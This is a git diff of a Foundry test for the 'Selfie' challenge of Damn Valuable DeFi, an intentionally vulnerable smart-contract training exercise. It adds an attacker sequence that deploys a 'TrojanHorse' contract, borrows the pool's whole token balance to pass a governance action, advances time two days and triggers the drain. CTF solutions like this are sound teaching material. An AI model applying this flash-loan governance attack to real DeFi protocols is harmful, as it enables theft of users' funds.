@@ -1,12 +1,13 @@
 // SPDX-License-Identifier: MIT
 pragma solidity >=0.8.0;
-
+ 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
 import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
+import {TrojanHorse} from "../../../src/Contracts/selfie/TrojanHorse.sol";
 
 contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
@@ -47,6 +48,19 @@ contract Selfie is Test {
         /**
          * EXPLOIT START *
          */
+
+        vm.startPrank(attacker);
+
+        //prob speed up block by 2 days
+        //vm.warp(block.timestamp + 3 days);
+
+        TrojanHorse trojan = new TrojanHorse(address(selfiePool), address(simpleGovernance), address(dvtSnapshot));
+        trojan.infiltrate(dvtSnapshot.balanceOf(address(selfiePool)));
+
+        vm.warp(block.timestamp + 2 days);
+        trojan.attack();
+
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
